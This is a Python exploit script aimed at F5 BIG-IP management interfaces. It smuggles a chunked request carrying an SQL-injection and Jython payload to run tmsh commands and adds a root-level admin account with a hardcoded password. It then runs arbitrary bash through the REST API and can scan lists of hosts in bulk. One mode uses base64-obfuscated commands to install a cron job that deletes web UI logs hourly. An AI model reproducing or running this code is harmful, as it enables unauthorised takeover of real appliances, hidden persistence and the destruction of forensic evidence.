import argparse
import base64
import json
import time
from urllib.parse import urljoin
import requests
import urllib3
from requests import Request
from requests import Session

urllib3.disable_warnings()
user = 'root66'
password = 'asdQWD2wsd23ew2a'
def execute_tmsh_command(target, tmsh):
    url = urljoin(target, '/tmui/login.jsp')
    block = b'\x00\x08HTTP/1.1\x00\x00(/tmui/tmui/locallb/workspace/dbquery.jsp\x00\x00\x01a\x00\x00\x00\x00\x00\x01a\x00\x00P\x00\x00\x02\x00\nREMOTEROLE\x00\x00\x010\x00\xa0\x0b\x00\x01a\x00\x03\x00\x05admin\x00\x05\x01\x97query=locallb.irule.ilx.select_plugin_path&column=0&object=\' union SELECT 1,"org.python.util.jython.main"("com.f5.util.StringUtils.splitOnFirstKeySeparator"(\'-c=from java.lang import Runtime;Runtime.getRuntime().exec(["tmsh","-c","' + tmsh + b'"])\')) from information_schema.system_users'
    suffix = b'/' * (514 - len(block) - 2) + b'\x00\xff'
    body = block + suffix

    request_session = Session()
    req_headers = dict()
    req_headers['Content-Type'] = 'application/x-www-form-urlencoded'
    req_headers['Transfer-Encoding'] = 'chunked, chunked'
    chunk_size_str = hex(int(514))[2:]
    data = list()
    data.append(chunk_size_str.encode())
    data.append(b'\r\n')
    data.append(body)
    data.append(b'\r\n')
    data.append(b'0')
    try:
        req = Request('POST', url, data=b''.join(data), headers=req_headers)
        prepped = req.prepare()
        prepped.headers['Content-Length'] = '0'
        resp = request_session.send(prepped, verify=False)
        if resp.status_code == 500 or resp.status_code == 200:
            print('[+] sql status:',resp.status_code)
            return True
        else:
            print('[-] execute tmsh command error:',resp.status_code)
            return False
    except Exception as ex:
        print('[-] execute tmsh command error: ', ex)
        return False


def first_login_change_password(target, username, password):
    api_url = urljoin(target, f'/mgmt/shared/authz/users/{username}')

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Referer': urljoin(target, '/tmui/tmui/login/expired_password/app/index.html'),
        'Cookie': 'f5advanceddisplay=""',
        'Authorization': 'Basic ' + base64.b64encode(f'{username}:{password}'.encode()).decode()
    }
    body = {'oldPassword': password, 'password': password}
    try:
        res = requests.patch(api_url, headers=headers, json=body, verify=False,proxies=PROXIES,timeout=30)
        if res.status_code == 200:
            print('[+] first login change password success')
            return True
        else:
            print('[!] first login change password ',res.status_code)
            return False
    except Exception as ex:
        print('[-] first login change password error: ', ex)
        return False


def execute_bash_command(target, username, password, cmd):
    api_url = urljoin(target, '/mgmt/tm/util/bash')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'Authorization': 'Basic ' + base64.b64encode(f'{username}:{password}'.encode()).decode()
    }

    data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(cmd)}
    try:
        res = requests.post(api_url, verify=False, headers=headers, json=data,proxies=PROXIES,timeout=30)
    except:
        print('[-] execute command connect error!')
        return False

    if res.status_code == 200 and "commandResult" in res.text:
        default = json.loads(res.text)
        print('[+] execute command success:', cmd)
        c = default['commandResult']
        print(c)
        return c
    else:
        print('[-] execute command error:', res.status_code)
        return None


def run_cmd(target, cmd):
    res = execute_bash_command(target, user, password, cmd)
    if res == None:
        tmsh_cmd = b'create auth user %s password %s shell bash partition-access add {all-partitions {role admin }}' % (
            user.encode(), password.encode())
        if execute_tmsh_command(target, tmsh_cmd):
            print('[+] add new root account success:', user, password)
            if first_login_change_password(target, user, password):
                res = execute_bash_command(target, user, password, cmd)
            else:
                print('[-] execute command faile')
    return res


def clear_account(target):
    tmsh_cmd = b'delete auth user %s ' % (user.encode(),)
    if execute_tmsh_command(target, tmsh_cmd):
        print('[+] remove added root account success:', user)


def delete_log_by_crontab(target):
    cmd_res = run_cmd(target,
                      "echo ZWNobyAicm0gLXJmIC92YXIvbG9nL3dlYnVpKi5sb2ciID4vdmFyL3N5c3RlbS9kaXNrdXBkYXRl|base64 -d|bash -i")
    if "error" in cmd_res:
        print("write task file error!")
        return
    else:
        print("write task success!")
        cmd_res = run_cmd(target, "crontab -l")
        if "diskupdate" in cmd_res:
            print("The scheduled task already exists")
            return
        print("starting Adding a scheduled task! ")
        cmd_res = run_cmd(target,
                          "echo KGNyb250YWIgLWw7ZWNobyAnMCAqLzEgKiAqICogL2Jpbi9iYXNoIC92YXIvc3lzdGVtL2Rpc2t1cGRhdGUnKXxjcm9udGFiIC0=|base64 -d|bash -i")
        if "error" in cmd_res:
            print("add task error!")
            return
        else:
            cmd_res = run_cmd(target, "crontab -l")
            if "diskupdate" in cmd_res:
                print("Adding a scheduled task succeeded. Procedure")

def check(target):
    res = run_cmd(target, 'id')
    if res != False:
        if res != None:
            with open('bigip5.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        clear_account(target)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='POC for vulnerability testing')
    parser.add_argument('--target', help='https://127.0.0.1:8443')
    parser.add_argument('--cmd', help='Command to execute')
    parser.add_argument('--deletelog', action='store_true', help='Delete logs by adding a scheduled task')
    parser.add_argument('--clear', action='store_true', help='Remove added root account')
    parser.add_argument('--proxy', help='http://127.0.0.1:8080')
    parser.add_argument('--check')
    parser.add_argument('--file')
    parser.set_defaults(clear=False)
    args = parser.parse_args()

    if args.proxy != None:
        PROXIES = {'http':args.proxy,'https':args.proxy}
    else:
        PROXIES = {}
    if args.file is not None:
        with open(args.file,'r') as f:
            for i in f:
                print('[+] Target:',i.replace('\n','').rstrip('/'))
                check(i.replace('\n','').rstrip('/'))
                print()
    elif args.check is not None:
        check(args.target)
    elif args.cmd is not None:
        run_cmd(args.target, args.cmd)
    elif args.deletelog:
        delete_log_by_crontab(args.target)
    elif args.clear:
        clear_account(args.target)
    else:
        parser.print_usage()
